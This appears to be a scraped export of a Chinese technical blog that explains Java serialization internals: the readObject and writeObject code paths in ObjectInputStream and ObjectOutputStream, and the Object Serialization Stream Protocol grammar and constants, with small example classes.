到目前为止，我们拿到了类描述符号desc，继续走readOrdinaryObject方法： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465private Object readOrdinaryObject(boolean unshared) throws IOException&#123; if (bin.readByte() != TC_OBJECT) &#123; throw new InternalError(); &#125; // 拿到类描述符 ObjectStreamClass desc = readClassDesc(false); //检查是否可以反序列化 desc.checkDeserialize(); Class&lt;?&gt; cl = desc.forClass(); if (cl == String.class || cl == Class.class || cl == ObjectStreamClass.class) &#123; throw new InvalidClassException(\"invalid class descriptor\"); &#125; Object obj; try &#123; obj = desc.isInstantiable() ? desc.newInstance() : null; &#125; catch (Exception ex) &#123; throw (IOException) new InvalidClassException( desc.forClass().getName(), \"unable to create instance\").initCause(ex); &#125; passHandle = handles.assign(unshared ? unsharedMarker : obj); //判断有无异常信息 ClassNotFoundException resolveEx = desc.getResolveException(); if (resolveEx != null) &#123; handles.markException(passHandle, resolveEx); &#125; if (desc.isExternalizable()) &#123; readExternalData((Externalizable) obj, desc); &#125; else &#123; //读取序列化数据，给字段赋值 readSerialData(obj, desc); &#125; // 处理handles的赋值 handles.finish(passHandle); if (obj != null &amp;&amp; handles.lookupException(passHandle) == null &amp;&amp; desc.hasReadResolveMethod()) &#123; Object rep = desc.invokeReadResolve(obj); if (unshared &amp;&amp; rep.getClass().isArray()) &#123; rep = cloneArray(rep); &#125; if (rep != obj) &#123; // Filter the replacement object if (rep != null) &#123; if (rep.getClass().isArray()) &#123; filterCheck(rep.getClass(), Array.getLength(rep)); &#125; else &#123; filterCheck(rep.getClass(), -1); &#125; &#125; handles.setObject(passHandle, obj = rep); &#125; &#125; return obj;&#125; readSerialData这里才是真正的开始序列化对象的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374private void readSerialData(Object obj, ObjectStreamClass desc) throws IOException&#123; //从父类开始 ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout(); for (int i = 0; i &lt; slots.length; i++) &#123; ObjectStreamClass slotDesc = slots[i].desc; if (slots[i].hasData) &#123; if (obj == null || handles.lookupException(passHandle) != null) &#123; defaultReadFields(null, slotDesc); // skip field values &#125; else if (slotDesc.hasReadObjectMethod()) &#123; ThreadDeath t = null; boolean reset = false; SerialCallbackContext oldContext = curContext; if (oldContext != null) oldContext.check(); try &#123; curContext = new SerialCallbackContext(obj, slotDesc); bin.setBlockDataMode(true); // 如果有readObject方法,执行 slotDesc.invokeReadObject(obj, this); &#125; catch (ClassNotFoundException ex) &#123; /* * In most cases, the handle table has already * propagated a CNFException to passHandle at this * point; this mark call is included to address cases * where the custom readObject method has cons'ed and * thrown a new CNFException of its own. */ handles.markException(passHandle, ex); &#125; finally &#123; do &#123; try &#123; curContext.setUsed(); if (oldContext!= null) oldContext.check(); curContext = oldContext; reset = true; &#125; catch (ThreadDeath x) &#123; t = x; // defer until reset is true &#125; &#125; while (!reset); if (t != null) throw t; &#125; /* * defaultDataEnd may have been set indirectly by custom * readObject() method when calling defaultReadObject() or * readFields(); clear it to restore normal read behavior. */ defaultDataEnd = false; &#125; else &#123; // 如果没有的话就执行默认的反序列化，给字段赋值 defaultReadFields(obj, slotDesc); &#125; if (slotDesc.hasWriteObjectData()) &#123; skipCustomData(); &#125; else &#123; bin.setBlockDataMode(false); &#125; &#125; else &#123; if (obj != null &amp;&amp; slotDesc.hasReadObjectNoDataMethod() &amp;&amp; handles.lookupException(passHandle) == null) &#123; slotDesc.invokeReadObjectNoData(obj); &#125; &#125; &#125; &#125; 执行结束之后就会返回一个对象obj，这个类就是序列化好的对象 回到readObject方法： 在反序列执行完成过后，它会调用vlist成员的doCallbacks来执行完成过后的回调逻辑，然后结束所有的序列化流程。 例子还是Student那个例子我们插入一个readObject 123456789101112131415161718192021public class Student implements Serializable &#123; private static final long serialVersionUID = 2L; private String name; private int age; public Student(String name, int age) &#123; this.name = name; this.age = age; &#125; private void readObject(ObjectInputStream in)&#123; System.out.println(\"You are hacked!\"); &#125; public static void main(String[] args) throws Exception &#123; //反序列化 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"10range.ser\")); Student o = (Student)ois.readObject(); ois.close(); &#125;&#125; 也就是说，我们需要反序列化出来的对象是Student，正好我们本地有，又因为有readObject方法，于是就直接从当前流中取出对象，执行了这个方法。 总结步骤 首先拿到desc 如果有readObject方法，用反射执行 没有的话给对象字段赋值 序列化对象成功","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Java序列化原理","slug":"Java序列化原理","permalink":"https://0range228.github.io/tags/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"}]},{"title":"Java对象序列化流协议梳理","slug":"Java对象序列化流协议梳理","date":"2021-07-16T07:27:51.000Z","updated":"2021-07-17T07:38:31.580Z","comments":true,"path":"Java对象序列化流协议梳理/","link":"","permalink":"https://0range228.github.io/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/","excerpt":"序言 浮云游子意，落日故人情。 协议原文Object Serialization Stream Protocol","text":"序言 浮云游子意，落日故人情。 协议原文Object Serialization Stream Protocol stream流元素stream，流元素，就是用来表示流中的对象。 现在在我们流中的每一个对象都需要表示，比如对象的类和类中的field字段。 流中对象的表示可以用语法来描述: 1234567null objectsnew objectsclassesarraysstringshandles (句柄，流中对象的方向引用)这个句柄从 0x7E0000 开始按顺序分配句柄。当流重置时，句柄在 0x7E0000 处重新启动。 stream中对象基本结构： 类对象由的ObjectStreamClass对象表示 非动态代理类对象的ObjectStreamClass由以下成分组成： 兼容类的流唯一标识符 (SUID) 一组指示类的各种属性的标志，例如该类是否定义了writeObject方法，以及该类是否可序列化、可外部化或枚举类型 可序列化字段的个数 默认情况下，对于类的字段数组和对象字段来说，字段的类型要作为字符串被包含，字段描述符格式Ljava/lang/Object; 由annotateClass方法写入的可选数据块 该对象父类的ObjectStreamClass ，如果父类不可序列化，该字段则为null 动态代理类对象的ObjectStreamClass由以下成分组成： 动态代理类实现的接口数量 动态代理类实现的所有接口名称，这些借口通过调用Class的getINterfaces方法的返回结果进行排序列出 由annotateProxyClass 方法写入的可选块数据记录或对象 父类对应的ObjectStreamClass和java.lang.reflect.Proxy 数组对象由以下成分组成： 他们的 ObjectStreamClass对象。 元素的数量。 值的序列。值的类型在数组的类型中是隐式的。例如，字节数组的值是byte类型。 Enum枚举类型: 常量的基本枚举类型的ObjectStreamClass对象。 常量的名称字符串。 流中的新对象new Objects由以下成组成： 所有对象类的派生类信息 对象的每一个可序列化类的数据，从最上面的父类开始写入。 对于每个类，流包含以下内容： 可序列化字段： 如果类有writeObject/readObject方法，那么有可能出现通过writeObject方法写入的可选对象或者基础类型的数据块Data-Block，跟着使用endDataBlock方法 备注： 所有由类写入的原始数据都被缓冲并包裹在块数据记录中，无论数据是在writeObject方法中写入流中，还是在writeObject方法之外直接写入流中。这些数据只能被相应的readObject方法读取或直接从流中读取。由writeObject方法写入的对象会终止之前的任何块数据记录，并根据情况被写成普通对象或空或反向引用。块数据记录允许错误恢复以丢弃任何可选数据。 当从一个类中调用时，流可以丢弃任何数据或对象，直到遇到endBlockData。 序列化流格式现在我们可以在对象流中随便抓一个stream。自顶向下解析它。 stream12stream: magic version contents 每个stream对象都是由三部分组成： magic : 魔数 STREAM_MAGIC 常量类型 表示内容类型 version：jdk版本号 STREAM_VERSION 常量类型 contents ：流对象内容 STREAM_MAGIC与STREAM_VERSION等常量值都在ObjectStreamConstants接口中定义。 contents123contents: content contents content 类似CFL，流中contents可以由一个content组成，也可以由多个contents组成 content这里以一个content为例： 123content: object blockdata 一个content可以是一个对象(object)，也可以是一个块数据(blockdata)。block在下面会详细说。 object1234567891011object: newObject newClass newArray newString newEnum newClassDesc prevObject nullReference exception TC_RESET 对象序列化流中的”对象”与Java中的对象概念有些不一样。对象序列化流中的”对象”分为上面那些种，最常见的是newObject、newString、newClassDesc。 newClassDesc表示ObjectStreamClass类的对象，可以简单理解为类的描述符。 newClass表示Class类对象，如person.class对象，就是Class类的一个实例对象。 newObject表示一个普通的对象，如果一个对象不是其他几种类型的对象（如newString、newClassDesc、newClass等），就归到newObject，如person对象。 接下来也是按照这个顺序解析： newClassDesc表示是一个类描述符 123newClassDesc: TC_CLASSDESC className serialVersionUID newHandle classDescInfo TC_PROXYCLASSDESC newHandle proxyClassDescInfo 这里列出来了两种类描述符种类： 一般正常的类描述符（主流） 1TC_CLASSDESC className serialVersionUID newHandle classDescInfo TC_CLASSDESC：类描述符的开始标志 className：类名 serialVersionUID：序列化ID newHandleL：新的引用 classDescInfo：类信息 动态代理类的类描述符 newObject表示该部分是一个新的对象。 12newObject: TC_OBJECT classDesc newHandle classdata[] // data for each class TC_OBJECT：常量，表示接下来是一个一个序列化Object的开始标志。 classDesc：当前这个对象的类描述符，里面存放的是类信息，字段信息。 newHandle：当前这个对象的引用句柄。 classData[]：这个对象对应的每一个Class的相关数据信息。这部分在下面会详细说 newClass表示该部分是一个新的Class类型的对象。 12newClass: TC_CLASS classDesc newHandle TC_CLASS：类型标记，表示接下来是一个序列化Class类型的对象。 classDesc：表示这个Class对象的类描述符。 newHandle： 新的引用。 classDesc表示一个对象的类描述符 12345classDesc: newClassDesc nullReference (ClassDesc)prevObject // an object required to be of type // ClassDesc newClassDesc：对象的类描述符 nullReference：空引用 (ClassDesc)prevObject ：表示前面出现过的对象（要求为ClassDesc类型的对象） superClassDesc表示父类的描述符 12superClassDesc: classDesc 如果被序列化对象的类，如果其父类没有实现Serializable接口，这个地方就是TC_NULL，表示空对象。 如果其父类实现了实现了Serializable接口，那此处会写入其父类对应的ObjectStreamClass对象，父类描述符。 classDescInfo表示是详细的类描述信息 12classDescInfo: classDescFlags fields classAnnotation superClassDesc classDescFlags：类描述信息标记 fields ：类中所有字段的描述信息 classAnnotation ：和类相关的Annotation的描述信息 superClassDesc：该类的父类的描述信息 proxyInterface12proxyInterfaceName: (utf) 动态代理类的代理接口的名称，一个UTF-8格式的字符串对应的二进制序列； proxyClassDescInfo123proxyClassDescInfo: (int)&lt;count&gt; proxyInterfaceName[count] classAnnotation superClassDesc 动态代理类的相关描述信息 &lt;count&gt;表示该动态代理类实现的接口总数，类型为int类型 proxyInterfaceName[count]表示所有当前动态代理类实现的接口信息 classAnnotation表示该动态代理类对应的Annotation的描述信息 superClassDesc表示当前动态代理类的父类的类描述信息 fields12fields: (short)&lt;count&gt; fieldDesc[count] &lt;count&gt;表示该类中fields总数，数据类型为short类型。 fieldDesc[count]表示一个类中所有字段的详细描述信息，字段的数量和前边的count是一致的； fieldDesc123fieldDesc: primitiveDesc objectDesc 表示fields描述信息 两部分： primitiveDesc ： 基础类型数据的描述符 objectDesc ：对象数据类型的描述信息 primitiveDesc12primitiveDesc: prim_typecode fieldName 表示8种基础类型的字段的相关描述信息。 prim_typecode ：基本类型字段的类型 如下 fieldName ： 字段名字 12345678`B` // byte`C` // char`D` // double`F` // float`I` // integer`J` // long`S` // short`Z` // boolean objectDesc 对象类型的field的描述信息。 对象类型字段 = 该成员 12objectDesc: obj_typecode fieldName className1 obj_typecode ：该成员的类型 如下 fieldName：该成员的名字 className1：该对象的类全名，String，// 包含字段类型的字符串，字段描述符格式 12`[` // array`L` // object classAnnotation123classAnnotation: endBlockData contents endBlockData // contents written by annotateClass 该对象所属类中的Annotation的描述信息 endBlockData : 终止符 意味着存储对象的数据块[Data-Block]的结束 contents endBlockData：该类中多个content的终止 这里多说一点： classAnotation是由ObjectOutputStream的annotateClass()方法写入的。 由于annotateClass()方法默认什么都不做。所以classAnnotations一般都是TC_ENDBLOCKDATA。 newArray一个新的数组的描述符 12newArray: TC_ARRAY classDesc newHandle (int)&lt;size&gt; values[size] TC_ARRAY ：表示新的数组类型的序列化对象的开始 classDesc：这个数组的类描述符号 newHandle：针对当前数组对象的引用 (int)&lt;size&gt;：该数组的长度，长度为int类型 values[size]：表示当前数组每一个元素值部分的内容 newString123newString: TC_STRING newHandle (utf) TC_LONGSTRING newHandle (long-utf) 表示一个字符串类型的对象 两种类型：STRING LONGSTRING newEnum表示一个枚举类型的对象 12newEnum: TC_ENUM classDesc newHandle enumConstantName TC_ENUM为枚举类型的标识，表示接下来的序列类型是枚举类型 classDesc为一个枚举类型的类描述符 newHandle为该枚举对象的引用 enumConstantName的值为调用枚举类型中的name()方法返回的枚举类型的值对应的字符串字面量 enumConstantName12enumConstantName: (String)object 枚举常量的字符串名称字面量，本身为一个字符串。 prevObject12prevObject TC_REFERENCE (int)handle 表示前一个对象，handle表示是前一个对象的引用。 nullReference12nullReference TC_NULL 表示null，一般这个值表示空引用。 exception12exception: TC_EXCEPTION reset (Throwable)object reset 表示异常 TC_EXCEPTION ： 异常信息的标识符 blockdata123blockdata: blockdatashort blockdatalong 在Java序列化中，数据块存储分为两种: 一种是长度为short的默认数据块方式 另外一种是长度为int的数据块方式，这种方式可存储容量大的数据； 如果我们只是往流中写入的是基本数据类型的数据，比如整数、浮点数，会在流中使用blockdata进行标记。 endBlockDataData-Block结束的标记 12345678blockdatashort: TC_BLOCKDATA (unsigned byte)&lt;size&gt; (byte)[size]blockdatalong: TC_BLOCKDATALONG (int)&lt;size&gt; (byte)[size]endBlockData : TC_ENDBLOCKDATA classdata[]123456789classdata: nowrclass // SC_SERIALIZABLE &amp; classDescFlag &amp;&amp; // !(SC_WRITE_METHOD &amp; classDescFlags) wrclass objectAnnotation // SC_SERIALIZABLE &amp; classDescFlag &amp;&amp; // SC_WRITE_METHOD &amp; classDescFlags externalContents // SC_EXTERNALIZABLE &amp; classDescFlag &amp;&amp; // !(SC_BLOCKDATA &amp; classDescFlags objectAnnotation // SC_EXTERNALIZABLE &amp; classDescFlag&amp;&amp; // SC_BLOCKDATA &amp; classDescFlags nowrclass12nowrclass: values // 类描述符顺序的字段 一个类中可序列化的字段的数据值，这些数据值的顺序遵循类描述符中定义的顺序； wrclass12wrclass: nowrclass 这部分数据的内容和上述的nowrclass部分的内容是一样的，表一个类中可序列化的字段的数据值； externalContents123externalContents: // externalContent written by externalContent // writeExternal in PROTOCOL_VERSION_1. externalContents externalContent 在PROTOCOL_VERSION_1中由writeExternal编写的外部内容。 这部分内容是上述的external内容的一个集合，一般这一部分只包含了使用writeExternal方法以PROTOCOL_VERSION_1的版本写入字节流的数据； externalContent123externalContent: // Only parseable by readExternal ( bytes) // primitive data 基础数据 8种 object 这部分描述的是external的相关内容 (bytes)部分的数据只能被readExternal方法读取，而且里面一般包含的数据类型是基础类型数据，object表示对象数据类型； objectAnnotation1234objectAnnotation: endBlockData contents endBlockData // contents written by writeObject // or writeExternal PROTOCOL_VERSION_2. 这部分数据的内容和classAnnotation的数据结构是一致的； 表示该对象所属类中的Annotation的描述信息，endBlockData为存储对象的数据块【Data-Block】的结束标记，为终止符，contents表示该类中多个内容的一个集合【contents】； values针对当前对象的classDesc对应的类描述信息提供描述类型的大小和类型； The size and types are described by the classDesc for the current object newHandle序列中的下一个数值将赋值给一个可序列化或者可执行反序列化的对象引用； reset一个已知对象的集合将会被放弃，重置该字节流； // The set of known objects is discarded so the objects of the exception do not overlap with the previously sent objects or with objects that may be sent after the exception 终端常量标识符在java.io.ObjectStreamConstants中： 123456789101112131415161718final static short STREAM_MAGIC = (short)0xaced;final static short STREAM_VERSION = 5;final static byte TC_NULL = (byte)0x70;final static byte TC_REFERENCE = (byte)0x71;final static byte TC_CLASSDESC = (byte)0x72;final static byte TC_OBJECT = (byte)0x73;final static byte TC_STRING = (byte)0x74;final static byte TC_ARRAY = (byte)0x75;final static byte TC_CLASS = (byte)0x76;final static byte TC_BLOCKDATA = (byte)0x77;final static byte TC_ENDBLOCKDATA = (byte)0x78;final static byte TC_RESET = (byte)0x79;final static byte TC_BLOCKDATALONG = (byte)0x7A;final static byte TC_EXCEPTION = (byte)0x7B;final static byte TC_LONGSTRING = (byte) 0x7C;final static byte TC_PROXYCLASSDESC = (byte) 0x7D;final static byte TC_ENUM = (byte) 0x7E;final static int baseWireHandle = 0x7E0000; classDescFlags会用到的： 12345final static byte SC_WRITE_METHOD = 0x01; //if SC_SERIALIZABLEfinal static byte SC_BLOCK_DATA = 0x08; //if SC_EXTERNALIZABLEfinal static byte SC_SERIALIZABLE = 0x02;final static byte SC_EXTERNALIZABLE = 0x04;final static byte SC_ENUM = 0x10; 协议还说的一段话，暂时看不懂，先写上： The flag SC_WRITE_METHOD is set if the Serializable class writing the stream had a writeObject method that may have written additional data to the stream. In this case a TC_ENDBLOCKDATA marker is always expected to terminate the data for that class. The flag SC_BLOCKDATA is set if the Externalizable class is written into the stream using STREAM_PROTOCOL_2. By default, this is the protocol used to write Externalizable objects into the stream in JDK 1.2. JDK 1.1 writes STREAM_PROTOCOL_1. The flag SC_SERIALIZABLE is set if the class that wrote the stream extended java.io.Serializable but not java.io.Externalizable, the class reading the stream must also extend java.io.Serializable and the default serialization mechanism is to be used. The flag SC_EXTERNALIZABLE is set if the class that wrote the stream extended java.io.Externalizable, the class reading the data must also extend Externalizable and the data will be read using its writeExternal and readExternal methods. The flag SC_ENUM is set if the class that wrote the stream was an enum type. The receiver’s corresponding class must also be an enum type. Data for constants of the enum type will be written and read as described in Section 1.12, “Serialization of Enum Constants“. 如果写入流的可序列化类具有writeObject方法，并且若该方法已将其他数据写入 stream ，则会设置标志SC_WRITE_METHOD。在这种情况下，TC_ENDBLOCKDATA标记总是希望终止该类的数据。 如果使用SC_BLOCKDATA将Externalizable类写入 stream，则设置标志SC_BLOCKDATA。默认情况下，在JDK 1.2中将Externalizable对象写入stream的协议。JDK1.1中写入STREAM_PROTOCOL_1 如果编写 stream 的类扩展了java.io.SERIALIZABLE而不是java.io.Externalizable，那么会设置标志 SC_SERIALIZABLE，读取 stream 的类也必须扩展java.io.SERIALIZABLE，并使用默认的序列化机制。 如果编写 stream 扩展java.io.EXTERNALIZABLE的类，读取数据的类也必须扩展EXTERNALIZABLE，并且如果使用其writeExternal和readExternal方法读取数据，那么会设置标记SC_EXTERNALIZABLE。 如果写入 stream 的类是枚举类型，则会设置标志SC_ENUM。接收方的对应类也必须是枚举类型。 例子这里写一个例子： 1234567891011121314151617public class Person implements Serializable &#123; private static final long serialVersionUID = 2L; private String name; private int age; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; public static void main(String[] args) throws Exception &#123; Person person = new Person(\"0range\", 100); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"0rangetest.ser\")); oos.writeObject(person); oos.close(); &#125;&#125; 直接上SerializationDumper看结果 1$ java -jar SerializationDumper.jar -r test.ser 思考一个问题，如果我们Person实现了writeObject方法，会怎么样呢？ 如果Person有writeObject方法，那要怎么设计呢？ 先解释第二个问题，来到java.io.ObjectOutputStream#writeSerialData方法： 12345678910111213141516171819202122232425262728293031323334353637383940/** * Writes instance data for each serializable class of given object, from * superclass to subclass. */private void writeSerialData(Object obj, ObjectStreamClass desc) throws IOException&#123; ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout(); for (int i = 0; i &lt; slots.length; i++) &#123; ObjectStreamClass slotDesc = slots[i].desc; if (slotDesc.hasWriteObjectMethod()) &#123; PutFieldImpl oldPut = curPut; curPut = null; SerialCallbackContext oldContext = curContext; if (extendedDebugInfo) &#123; debugInfoStack.push( \"custom writeObject data (class \\\"\" + slotDesc.getName() + \"\\\")\"); &#125; try &#123; curContext = new SerialCallbackContext(obj, slotDesc); bout.setBlockDataMode(true); slotDesc.invokeWriteObject(obj, this); bout.setBlockDataMode(false); bout.writeByte(TC_ENDBLOCKDATA); &#125; finally &#123; curContext.setUsed(); curContext = oldContext; if (extendedDebugInfo) &#123; debugInfoStack.pop(); &#125; &#125; curPut = oldPut; &#125; else &#123; defaultWriteFields(obj, slotDesc); &#125; &#125;&#125; 可以看到，如果该类有writeObject方法，那么就slotDesc.invokeWriteObject(obj, this); 跟进invokeWriteObject: 12345678910111213141516171819202122232425262728/** * Invokes the writeObject method of the represented serializable class. * Throws UnsupportedOperationException if this class descriptor is not * associated with a class, or if the class is externalizable, * non-serializable or does not define writeObject. */void invokeWriteObject(Object obj, ObjectOutputStream out) throws IOException, UnsupportedOperationException&#123; requireInitialized(); if (writeObjectMethod != null) &#123; try &#123; writeObjectMethod.invoke(obj, new Object[]&#123; out &#125;); &#125; catch (InvocationTargetException ex) &#123; Throwable th = ex.getTargetException(); if (th instanceof IOException) &#123; throw (IOException) th; &#125; else &#123; throwMiscException(th); &#125; &#125; catch (IllegalAccessException ex) &#123; // should not occur, as access checks have been suppressed throw new InternalError(ex); &#125; &#125; else &#123; throw new UnsupportedOperationException(); &#125;&#125; 这里其实需要考虑writeObjectMethod这个属性 12/** class-defined writeObject method, or null if none */private Method writeObjectMethod; 这个属性本身类型就是java.lang.reflect.Method，属于反射的作用范围。 找了一圈发现，在ObjectStreamClass类的构造函数里面就有一句： 12345678...writeObjectMethod = getPrivateMethod(cl, \"writeObject\", new Class&lt;?&gt;[] &#123; ObjectOutputStream.class &#125;, Void.TYPE);readObjectMethod = getPrivateMethod(cl, \"readObject\", new Class&lt;?&gt;[] &#123; ObjectInputStream.class &#125;, Void.TYPE);... 所以在这里，已经判断了这个类是否存在writeObject方法，同时也寻找了readObject方法。 如果writeObejct存在的话就封装为Method，赋值给writeObjectMethod属性。 细心的你应该也能发现，这里对writeObject做了限制： 参数必须为ObjectOutputStream类型 返回值必须为void 必须为 private 非static 到这里我们解答了第二个问题，并且知道，如果你要实现writeObject必须要形式如下： 123public void writeObject(ObjectOutputStream oos)&#123; ...&#125; 那现在就写一个： 我们在writeObject方法内部只是调用defaultWriteObject()方法写入对象字段数据。 再看一遍： 可以发现在最后面多了一块： 并且在前面多了一块： 1classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE 表明当前对象的类是有writeObject方法的 由于annotateClass()方法默认为空，所以objectAnnotations后一般会设置TC_ENDBLOCKDATA标识； 如果我们自己的writeObject不仅仅是defaultWriteObject： 对比看区别： 在classdata部分又多出来了一些内容，也就是写入了自定义数据， blockdata表示下面的就是一个数据块，因为我们往里存放的是一个整数666，所以长度为int类型的长度4，contents内容就是16进制的666。 参考panda xz.aliyun.com Object Serialization Stream Protocol","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Java序列化原理","slug":"Java序列化原理","permalink":"https://0range228.github.io/tags/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"}]},{"title":"Java序列化流程梳理","slug":"Java序列化流程梳理","date":"2021-07-15T11:37:36.000Z","updated":"2021-07-17T05:29:49.090Z","comments":true,"path":"Java序列化流程梳理/","link":"","permalink":"https://0range228.github.io/Java%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/","excerpt":"序言 浮云游子意，落日故人情。 梳理Java序列化流程。 参考panda师傅。","text":"序言 浮云游子意，落日故人情。 梳理Java序列化流程。 参考panda师傅。 写在前面Java序列化就是将对象写入到I/O流之中，通常输出格式为.ser文件。 简单说首先创建一个ObjectOutputStream输出流对象，然后调用ObjectOutputStream对象的writeObject方法，按照规范格式输出可序列化对象。 具体流程接下来一步一步走，消化一遍panda师傅的文章。 例子： 123456789101112131415public class Serialize &#123; public static class Demo implements Serializable &#123; private String string; transient String name = \"hello\"; public Demo(String s) &#123; this.string = s; &#125; public static void main(String[] args) throws IOException &#123; Demo demo = new Demo(\"panda\"); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"panda.out\")); outputStream.writeObject(new Demo(\"panda\")); outputStream.close(); &#125; &#125;&#125; 构造函数12ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"panda.out\"));outputStream.writeObject(new Demo(\"panda\")); 首先来到public ObjectOutputStream(OutputStream out)构造函数 1234567891011121314151617181920/*** 创建写入指定输出流的ObjectOutputStream。* 此构造函数将序列化流头写入底层流；* 调用者可能希望立即刷新流，以确保接收ObjectInputStreams的构造函数在读取头时不会阻塞。* 如果安装了安全管理器，则当重写ObjectOutputStream.putFields或ObjectOutputStream.writeUnshared方法的子类的构造函数直接或间接调用时，此构造函数将检查“enableSublassimplementation”SerializablePermission。*/public ObjectOutputStream(OutputStream out) throws IOException &#123; verifySubclass(); bout = new BlockDataOutputStream(out); handles = new HandleTable(10, (float) 3.00); subs = new ReplaceTable(10, (float) 3.00); enableOverride = false; writeStreamHeader(); bout.setBlockDataMode(true); if (extendedDebugInfo) &#123; debugInfoStack = new DebugTraceInfoStack(); &#125; else &#123; debugInfoStack = null; &#125;&#125; 一头雾水，接下来一步一步梳理： verifySubclass()方法: 验证本类（或其子类）实例可以在不违反安全约束的情况下被构造出来。 123456789101112131415161718192021222324private void verifySubclass() &#123; Class&lt;?&gt; cl = getClass(); //如果构造的不是ObjectOutputStream的子类则直接返回 if (cl == ObjectOutputStream.class) return; //否则获取安全管理器检查是否有继承ObjectOutputStream的权限 SecurityManager sm = System.getSecurityManager(); if (sm == null) return; //移除Caches中已经失去引用的Class对象 processQueue(Caches.subclassAuditsQueue, Caches.subclassAudits); //将ObjectOutputStream的子类存入Caches WeakClassKey key = new WeakClassKey(cl, Caches.subclassAuditsQueue); Boolean result = Caches.subclassAudits.get(key); if (result == null) &#123; result = Boolean.valueOf(auditSubclass(cl)); Caches.subclassAudits.putIfAbsent(key, result); &#125; if (result.booleanValue()) return; //如果没有权限则抛出SecurityException异常 sm.checkPermission(SUBCLASS_IMPLEMENTATION_PERMISSION);&#125; 接下来可以看到对bout,handles,subs,enableOverride一些成员变量进行了复制，跳到他们的声明处看一看： 1234567891011121314151617/** filter stream for handling block data conversion */private final BlockDataOutputStream bout;/** obj -&gt; wire handle map */private final HandleTable handles;/** obj -&gt; replacement obj map */private final ReplaceTable subs;/** stream protocol version */private int protocol = PROTOCOL_VERSION_2;/** recursion depth */private int depth;/** buffer for writing primitive field values */private byte[] primVals;/** if true, invoke writeObjectOverride() instead of writeObject() */private final boolean enableOverride;/** if true, invoke replaceObject() */private boolean enableReplace; 重点挑这几个说： bout：用来处理数据块转换的数据流，理解为一个容器 handles ：对象-&gt;handle引用 subs: 对象-&gt;替换对象 enableOverride：布尔值 用来决定在序列化Java对象时选用writeObjectOverride方法还是writeObject方法 通常为false 关于 handles 的作用，举个例子，我们知道 Java 序列化除了保存字段信息外，还保存有类信息，当同一个对象序列化两次时第二次只用保存第一次的编号，这样可以大大减少序列化文件的大小。 你肯定对第一个bout的理解有些别扭。 开启支线任务，什么是BlockDataOutputStream？ BlockDataOutputStreamBlockDataOutputStream是ObjectOutputStream的一个重要内部类，这个类负责将缓冲区中的数据写入到字节流。 该类部分内容如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243&#x2F;** * Buffered output stream with two modes: in default mode, outputs data in * same format as DataOutputStream; in &quot;block data&quot; mode, outputs data * bracketed by block data markers (see object serialization specification * for details). *&#x2F;private static class BlockDataOutputStream extends OutputStream implements DataOutput&#123; &#x2F;** maximum data block length *&#x2F; private static final int MAX_BLOCK_SIZE &#x3D; 1024; &#x2F;** maximum data block header length *&#x2F; private static final int MAX_HEADER_SIZE &#x3D; 5; &#x2F;** (tunable) length of char buffer (for writing strings) *&#x2F; private static final int CHAR_BUF_SIZE &#x3D; 256; &#x2F;** buffer for writing general&#x2F;block data *&#x2F; private final byte[] buf &#x3D; new byte[MAX_BLOCK_SIZE]; &#x2F;** buffer for writing block data headers *&#x2F; private final byte[] hbuf &#x3D; new byte[MAX_HEADER_SIZE]; &#x2F;** char buffer for fast string writes *&#x2F; private final char[] cbuf &#x3D; new char[CHAR_BUF_SIZE]; &#x2F;** block data mode *&#x2F; private boolean blkmode &#x3D; false; &#x2F;** current offset into buf *&#x2F; private int pos &#x3D; 0; &#x2F;** underlying output stream *&#x2F; private final OutputStream out; &#x2F;** loopback stream (for data writes that span data blocks) *&#x2F; private final DataOutputStream dout; &#x2F;** * Creates new BlockDataOutputStream on top of given underlying stream. * Block data mode is turned off by default. *&#x2F; BlockDataOutputStream(OutputStream out) &#123; this.out &#x3D; out; dout &#x3D; new DataOutputStream(this); &#125; ... &#125; 大致意思就是： 缓冲输出流有两种模式： 在默认模式下，以与DataOutputStream相同的格式输出数据； 在 “块数据 “模式下，输出数据 在 “块数据 “模式下，输出由块数据标记括起来的数据 – 详见对象序列化规范。 可以理解成BlockDataOutputStream类是封装后的DataOutputStream类，并且提供了一些缓冲区及成员属性。 在给这些成员变量赋值结束之后，接下来进入writeStreamHeader方法。 熟悉的aced0005出现了，可以理解为bout就是我们的句柄，负责缓存我们的序列化数据。 接下来是bout.setBlockDataMode(true); 将bout设置为块模式 核心：writeObject构造函数执行结束之后，就要来到第二句话:outputStream.writeObject(new Demo(&quot;panda&quot;)); 1234567891011121314public final void writeObject(Object obj) throws IOException &#123; if (enableOverride) &#123; writeObjectOverride(obj); return; &#125; try &#123; writeObject0(obj, false); &#125; catch (IOException ex) &#123; if (depth == 0) &#123; writeFatalException(ex); &#125; throw ex; &#125;&#125; 可以说；writeObject 将所有序列委托给了 writeObject0 完成，如果序列化出现异常调用 writeFatalException 方法。 首先是if(enableOverride) ，这里面的enableOverride其实一般都是false(上一步的构造函数)，那么就直接进入到writeObject0方法： 核中核 ：writeObject0writeObject0 比较复杂，大致可分为三个部分： 一是判断需不需要序列化； 二是判断是否替换了对象； 三是终于可以序列化。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889/*** Underlying writeObject/writeUnshared implementation.*/private void writeObject0(Object obj, boolean unshared) throws IOException&#123; 